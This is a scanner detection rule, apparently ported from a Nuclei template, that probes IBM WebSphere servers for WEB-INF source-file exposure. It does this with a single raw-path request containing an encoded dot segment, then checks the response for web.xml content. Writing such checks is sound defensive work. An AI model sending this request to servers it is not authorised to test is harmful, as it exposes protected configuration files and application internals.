schema_version: 1
id: "cortex.community:ibm-websphere-xml"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "http.preserve_raw_path.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "IBM WebSphere Application - Source File Exposure"
  description: "Disclose application specific files contained within the war file, including files under the web-inf and meta-inf directories. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.acunetix.com/vulnerabilities/web/ibm-websphere-weblogic-application-source-file-exposure/"
  cwes: [219]
  tags: ["ibm", "websphere", "exposure", "misconfig", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Medium"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/iojs/%2e/WEB-INF/web.xml", path_mode: "preserve_raw" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "</web-app>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<servlet>" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
